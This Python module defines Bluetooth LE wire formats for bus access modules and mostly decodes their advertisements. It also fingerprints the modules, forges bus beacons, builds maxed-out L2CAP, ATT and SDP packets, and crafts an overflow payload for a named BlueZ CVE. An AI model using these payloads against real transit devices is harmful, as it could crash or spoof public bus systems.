# wire formats for the pader sprinter bus access modules

from __future__ import annotations

import hashlib
import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import Iterable

BUS_SERVICE = "00001f1f-0000-1000-8000-00805f9b34fb"
ROUTE_SERVICE = "0000201f-0000-1000-8000-00805f9b34fb"
ROUTE_CHARACTERISTIC = "00002020-0000-1000-8000-00805f9b34fb"
ACTION_CHARACTERISTIC = "00001f20-0000-1000-8000-00805f9b34fb"
GATT_SERVICE = "00001801-0000-1000-8000-00805f9b34fb"
SERVICE_CHANGED = "00002a05-0000-1000-8000-00805f9b34fb"
DEVICE_NAME = "00002a00-0000-1000-8000-00805f9b34fb"
PNP_ID = "00002a50-0000-1000-8000-00805f9b34fb"
FIRMWARE_REVISION = "00002a26-0000-1000-8000-00805f9b34fb"
HARDWARE_REVISION = "00002a27-0000-1000-8000-00805f9b34fb"
SOFTWARE_REVISION = "00002a28-0000-1000-8000-00805f9b34fb"
MODEL_NUMBER = "00002a24-0000-1000-8000-00805f9b34fb"
MANUFACTURER_NAME = "00002a29-0000-1000-8000-00805f9b34fb"
BATTERY_LEVEL = "00002a19-0000-1000-8000-00805f9b34fb"

MANUFACTURER_REAL = 0x7D78
MANUFACTURER_SIM = 0x7D79
COMPANY_PADERSPRINTER = 4
PROTOCOL_16 = 16
PROTOCOL_18 = 18

OUI_HD_WIRELESS = "78:C4:0E"
OUI_OLD_MODULES = ("00:07:80", "88:6B:0F", "94:E6:86", "70:B8:F6")

KNOWN_PSMS = {
    0x0001: "SDP",
    0x0003: "RFCOMM",
    0x0005: "TCS-BIN",
    0x0007: "TCS-BIN-CORDLESS",
    0x000F: "BNEP",
    0x0011: "HIDP-Control",
    0x0013: "HIDP-Interrupt",
    0x0015: "UPnP",
    0x0017: "AVCTP",
    0x0019: "AVDTP",
    0x001B: "AVCTP-Browsing",
    0x001D: "UDI-C-Plane",
    0x001F: "UDI-C-Data",
    0x0021: "MCAP-Control",
    0x0023: "MCAP-Data",
    0x0025: "ATT",
    0x0027: "3DSP",
    0x0029: "IPSP",
}


class Result(str, Enum):
    OK = "ok"
    UNKNOWN_PROTOCOL = "unknown_protocol"
    UNKNOWN_COMPANY = "unknown_company"
    UNKNOWN_MANUFACTURER = "unknown_manufacturer"
    TOO_SHORT = "too_short"
    NO_MANUFACTURER = "no_manufacturer"
    PARSER_EXCEPTION = "parser_exception"


@dataclass
class Structures:
    uuids: list[str] = field(default_factory=list)
    service_data: dict[str, str] = field(default_factory=dict)
    manufacturer: list[bytes] = field(default_factory=list)
    error: str | None = None


@dataclass
class Decoded:
    result: str
    error: str | None = None
    protocol: int | None = None
    company: int | None = None
    flags: int | None = None
    line_id: int | None = None
    destination_id: int | None = None
    next_stop_id: int | None = None
    hardware_id: int | None = None
    course: int | None = None
    unknown_hex: str | None = None
    simulator: bool = False
    line_text: str | None = None
    data_version: int | None = None

    @property
    def ok(self) -> bool:
        return self.result == Result.OK.value


@dataclass
class VehicleText:
    destination: str
    next_stop: str
    rest: str = ""


def hexb(value: bytes) -> str:
    return value.hex()


def unhex(value: str) -> bytes:
    return bytes.fromhex(value.replace(" ", "").replace(":", ""))


def sha256(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def _uuid_of(le: bytes) -> str:
    if len(le) in (2, 4):
        value = int.from_bytes(le, "little")
        return f"{value:08x}-0000-1000-8000-00805f9b34fb"
    return (
        f"{le[::-1].hex()[:8]}-{le[::-1].hex()[8:12]}-{le[::-1].hex()[12:16]}-"
        f"{le[::-1].hex()[16:20]}-{le[::-1].hex()[20:]}"
    )


def parse_structures(raw: bytes) -> Structures:
    uuids: list[str] = []
    service_data: dict[str, str] = {}
    manufacturer: list[bytes] = []
    error: str | None = None
    i = 0
    while i < len(raw):
        length = raw[i]
        if length == 0:
            break
        if i + length + 1 > len(raw):
            error = f"AD structure at byte {i} overruns end ({length} bytes)"
            break
        ad_type = raw[i + 1]
        body = raw[i + 2 : i + length + 1]
        width = {0x02: 2, 0x03: 2, 0x04: 4, 0x05: 4, 0x06: 16, 0x07: 16}.get(ad_type, 0)
        if width:
            if len(body) % width:
                error = error or f"UUID list (type 0x{ad_type:02x}) has invalid length {len(body)}"
            else:
                uuids.extend(_uuid_of(body[n : n + width]) for n in range(0, len(body), width))
        elif ad_type == 0x16 and len(body) >= 2:
            service_data[_uuid_of(body[:2])] = body[2:].hex()
        elif ad_type == 0x20 and len(body) >= 4:
            service_data[_uuid_of(body[:4])] = body[4:].hex()
        elif ad_type == 0x21 and len(body) >= 16:
            service_data[_uuid_of(body[:16])] = body[16:].hex()
        elif ad_type == 0xFF:
            manufacturer.append(body)
        i += length + 1
    return Structures(uuids, service_data, manufacturer, error)


def _word(data: bytes, offset: int) -> int:
    return data[offset] | (data[offset + 1] << 8)


def candidate_reason(structures: Structures) -> str | None:
    if BUS_SERVICE in structures.uuids:
        return "Service 0x1f1f"
    if any(len(m) >= 2 and _word(m, 0) in (MANUFACTURER_REAL, MANUFACTURER_SIM) for m in structures.manufacturer):
        return "Hersteller 0x7d78"
    return None


def decode_bus(structures: Structures) -> Decoded:
    data = next(
        (m for m in structures.manufacturer if len(m) >= 2 and _word(m, 0) in (MANUFACTURER_REAL, MANUFACTURER_SIM)),
        structures.manufacturer[0] if structures.manufacturer else None,
    )
    if data is None:
        return Decoded(Result.NO_MANUFACTURER.value, structures.error or "no manufacturer data")
    simulator = len(data) >= 2 and _word(data, 0) == MANUFACTURER_SIM
    if len(data) < 4:
        return Decoded(Result.TOO_SHORT.value, f"manufacturer data only {len(data)} bytes", unknown_hex=data.hex())
    protocol = (data[2] << 8) | data[3]
    if len(data) < 18:
        return Decoded(
            Result.TOO_SHORT.value,
            f"manufacturer data only {len(data)} bytes, expected 18",
            protocol=protocol,
            simulator=simulator,
            unknown_hex=data.hex(),
        )
    if protocol == PROTOCOL_18 and (_word(data, 0) == MANUFACTURER_REAL or simulator):
        return _decode_protocol18(data, simulator)
    base = Decoded(
        result=Result.OK.value,
        protocol=protocol,
        company=data[5],
        flags=data[4],
        line_id=_word(data, 6),
        destination_id=_word(data, 8),
        next_stop_id=_word(data, 10),
        hardware_id=_word(data, 12),
        course=_word(data, 14),
        simulator=simulator,
        unknown_hex=data[16:].hex() or None,
    )
    if _word(data, 0) != MANUFACTURER_REAL and not simulator:
        return Decoded(**{**base.__dict__, "result": Result.UNKNOWN_MANUFACTURER.value, "error": f"manufacturer 0x{_word(data, 0):04x}"})
    if protocol != PROTOCOL_16:
        return Decoded(**{**base.__dict__, "result": Result.UNKNOWN_PROTOCOL.value, "error": f"protocol {protocol} not 16"})
    if base.company != COMPANY_PADERSPRINTER:
        return Decoded(**{**base.__dict__, "result": Result.UNKNOWN_COMPANY.value, "error": f"company {base.company} not 4"})
    return base


def _decode_protocol18(data: bytes, simulator: bool) -> Decoded:
    text = data[11:]
    text = text.split(b"\x00", 1)[0]
    base = Decoded(
        Result.OK.value,
        protocol=PROTOCOL_18,
        flags=data[4],
        simulator=simulator,
        unknown_hex=data[5:10].hex(),
        data_version=data[4] & 0x07,
    )
    if data[10] != 0x80 or not text or any(b < 0x21 or b > 0x7E for b in text):
        return Decoded(**{**base.__dict__, "result": Result.UNKNOWN_PROTOCOL.value, "error": "protocol 18 without line text at byte 10"})
    return Decoded(**{**base.__dict__, "line_text": text.decode("ascii")})


def vehicle_text(raw: bytes) -> VehicleText | None:
    try:
        fields = [part.strip() for part in raw.decode("utf-8").split("\x1d")]
    except UnicodeDecodeError:
        return None
    if not fields or not fields[0]:
        return None
    if len(fields) < 2 or not fields[1]:
        return None
    return VehicleText(fields[0], fields[1], "\x1d".join(fields[2:]))


def profile_id(session_id: str, address: str) -> str:
    return "p-" + sha256(f"{session_id}:{address.upper()}".encode())[:8]


def parse_pnp_id(raw: bytes) -> dict[str, object]:
    if len(raw) < 7:
        return {"raw": raw.hex(), "valid": False}
    vendor_source = raw[0]
    vendor = int.from_bytes(raw[1:3], "little")
    product = int.from_bytes(raw[3:5], "little")
    version = int.from_bytes(raw[5:7], "little")
    return {
        "raw": raw.hex(),
        "valid": True,
        "vendor_source": vendor_source,
        "vendor": f"0x{vendor:04x}",
        "product": f"0x{product:04x}",
        "product_version": f"0x{version:04x}",
        "bluez_guess": f"{version >> 8}.{version & 0xff}" if vendor == 0x1D6B and product == 0x0246 else None,
    }


def fingerprint(address: str, name: str | None, pnp: dict[str, object] | None, decoded: Decoded | None) -> dict[str, object]:
    oui = address.upper()[:8]
    tags: list[str] = []
    if oui == OUI_HD_WIRELESS:
        tags.append("hd-wireless")
    if name and name.lower() in ("ivi", "ivc"):
        tags.append("ivanti-module")
    if pnp and pnp.get("bluez_guess"):
        tags.append("bluez")
    if decoded and decoded.protocol == PROTOCOL_18:
        tags.append("protocol-18")
    if decoded and decoded.protocol == PROTOCOL_16:
        tags.append("protocol-16")
    return {
        "oui": oui,
        "vendor": "H&D Wireless" if oui == OUI_HD_WIRELESS else None,
        "name": name,
        "tags": tags,
        "bluez_guess": pnp.get("bluez_guess") if pnp else None,
    }


def eir_overflow_name(length: int = 253) -> bytes:
    # cve-2026-80186: each invalid byte grows to two bytes in name2utf8
    if not 1 <= length <= 253:
        raise ValueError("length must be 1..253")
    return b"\xff" * length


def eir_overflow_advertisement(length: int = 253) -> bytes:
    # 255-byte ad: length 254, type 0x09, 253 invalid bytes
    name = eir_overflow_name(length)
    ad = bytes([len(name) + 1, 0x09]) + name
    if len(ad) > 255:
        raise ValueError("advertisement exceeds 255 bytes")
    return ad


def eir_overflow_extended_advertisement(length: int = 253) -> bytes:
    # same payload for an extended advertising set
    return eir_overflow_advertisement(length)


def ad_structures(*structures: bytes) -> bytes:
    return b"".join(structures)


def ad_flags(value: int = 0x06) -> bytes:
    return bytes([2, 0x01, value])


def ad_service_uuid16(uuid: int) -> bytes:
    return bytes([3, 0x03]) + struct.pack("<H", uuid)


def ad_name(name: bytes, complete: bool = True) -> bytes:
    return bytes([len(name) + 1, 0x09 if complete else 0x08]) + name


def ad_manufacturer(company: int, payload: bytes) -> bytes:
    body = struct.pack("<H", company) + payload
    return bytes([len(body) + 1, 0xFF]) + body


def bus_advertisement(line: str, data_version: int = 0, company: int = MANUFACTURER_REAL) -> bytes:
    payload = bytearray(16)
    payload[0:2] = struct.pack(">H", PROTOCOL_18)
    payload[2] = data_version & 0x07
    payload[3:8] = bytes.fromhex("e121040101")
    payload[8] = 0x80
    payload[9 : 9 + len(line)] = line.encode("ascii")
    return ad_structures(ad_flags(), ad_service_uuid16(0x1F1F), ad_manufacturer(company, bytes(payload)))


def att_pdu(opcode: int, body: bytes = b"") -> bytes:
    return bytes([opcode]) + body


def att_error(request: int, handle: int, reason: int) -> bytes:
    return att_pdu(0x01, struct.pack("<BH", request, handle) + bytes([reason]))


def att_mtu_request(mtu: int = 517) -> bytes:
    return att_pdu(0x02, struct.pack("<H", mtu))


def att_find_information(start: int, end: int) -> bytes:
    return att_pdu(0x04, struct.pack("<HH", start, end))


def att_find_by_type_value(start: int, end: int, uuid: int, value: bytes) -> bytes:
    return att_pdu(0x06, struct.pack("<HHH", start, end, uuid) + value)


def att_read_by_type(start: int, end: int, uuid: int | bytes) -> bytes:
    if isinstance(uuid, int):
        uuid = struct.pack("<H", uuid)
    return att_pdu(0x08, struct.pack("<HH", start, end) + uuid)


def att_read(start: int) -> bytes:
    return att_pdu(0x0A, struct.pack("<H", start))


def att_read_blob(offset: int) -> bytes:
    return att_pdu(0x0C, struct.pack("<H", offset))


def att_read_by_group_type(start: int, end: int, uuid: int | bytes) -> bytes:
    if isinstance(uuid, int):
        uuid = struct.pack("<H", uuid)
    return att_pdu(0x10, struct.pack("<HH", start, end) + uuid)


def att_write_request(handle: int, value: bytes) -> bytes:
    return att_pdu(0x12, struct.pack("<H", handle) + value)


def att_write_command(handle: int, value: bytes) -> bytes:
    return att_pdu(0x52, struct.pack("<H", handle) + value)


def att_prepare_write(handle: int, offset: int, value: bytes) -> bytes:
    return att_pdu(0x16, struct.pack("<HH", handle, offset) + value)


def att_execute_write(flags: int = 1) -> bytes:
    return att_pdu(0x18, bytes([flags]))


def att_handle_value_confirmation(handle: int) -> bytes:
    return att_pdu(0x1E, struct.pack("<H", handle))


def l2cap_command(code: int, identifier: int, data: bytes = b"") -> bytes:
    return struct.pack("<BBH", code, identifier, len(data)) + data


def l2cap_connect(identifier: int, psm: int, scid: int = 0x0040) -> bytes:
    return l2cap_command(0x02, identifier, struct.pack("<HHH", psm, scid, 0xFFFF))


def l2cap_connect_response(identifier: int, dcid: int, scid: int, result: int = 0, status: int = 0) -> bytes:
    return l2cap_command(0x03, identifier, struct.pack("<HHHH", dcid, scid, result, status))


def l2cap_config_request(identifier: int, dcid: int, options: bytes = b"") -> bytes:
    return l2cap_command(0x04, identifier, struct.pack("<H", dcid) + options)


def l2cap_config_response(identifier: int, scid: int, options: bytes = b"", result: int = 0) -> bytes:
    return l2cap_command(0x05, identifier, struct.pack("<HH", scid, 0) + options)


def l2cap_disconnect_request(identifier: int, dcid: int, scid: int) -> bytes:
    return l2cap_command(0x06, identifier, struct.pack("<HH", dcid, scid))


def l2cap_info_request(identifier: int, info_type: int) -> bytes:
    return l2cap_command(0x0A, identifier, struct.pack("<H", info_type))


def l2cap_ecrb(identifier: int, mtu: int = 0xFFFF, mps: int = 0xFFFF, credits: int = 0xFFFF) -> bytes:
    return l2cap_command(0x0C, identifier, struct.pack("<HHH", mtu, mps, credits))


def l2cap_ecrb_response(identifier: int, scid: int, mtu: int, mps: int, credits: int, result: int = 0) -> bytes:
    return l2cap_command(0x0D, identifier, struct.pack("<HHHHH", scid, mtu, mps, credits, result))


def l2cap_credit_based_connect(identifier: int, psm: int, scid: int, mtu: int, mps: int, credits: int) -> bytes:
    return l2cap_command(0x17, identifier, struct.pack("<HHHHH", psm, scid, mtu, mps, credits))


def l2cap_flow_control_credit(identifier: int, cid: int, credits: int) -> bytes:
    return l2cap_command(0x19, identifier, struct.pack("<HH", cid, credits))


def sdp_pdu(pdu_id: int, transaction: int, params: bytes = b"") -> bytes:
    return struct.pack(">BHH", pdu_id, transaction, len(params)) + params


def sdp_service_search(pattern: bytes = b"\x35\x03\x19\x11\x0b", max_records: int = 0xFFFF) -> bytes:
    return sdp_pdu(0x02, 1, struct.pack(">H", max_records) + pattern)


def sdp_service_attribute(handle: int, max_bytes: int = 0xFFFF, ranges: bytes = b"\x35\x05\x0a\x00\x00\xff\xff") -> bytes:
    return sdp_pdu(0x04, 2, struct.pack(">IH", handle, max_bytes) + ranges)


def sdp_service_search_attribute(pattern: bytes = b"\x35\x03\x19\x11\x0b", max_bytes: int = 0xFFFF) -> bytes:
    return sdp_pdu(0x06, 3, struct.pack(">H", max_bytes) + pattern + b"\x35\x05\x0a\x00\x00\xff\xff")


def adb_oui(address: str) -> str:
    return address.upper()[:8]


def summarize(decoded: Decoded) -> str:
    if decoded.line_text:
        return f"protocol 18 line {decoded.line_text!r} version {decoded.data_version}"
    if decoded.ok:
        return f"protocol 16 line {decoded.line_id} course {decoded.course} hw {decoded.hardware_id}"
    return f"{decoded.result}: {decoded.error}"


def iter_ad_structures(raw: bytes) -> Iterable[tuple[int, bytes]]:
    i = 0
    while i < len(raw):
        length = raw[i]
        if length == 0:
            return
        if i + length + 1 > len(raw):
            return
        yield raw[i + 1], raw[i + 2 : i + length + 1]
        i += length + 1
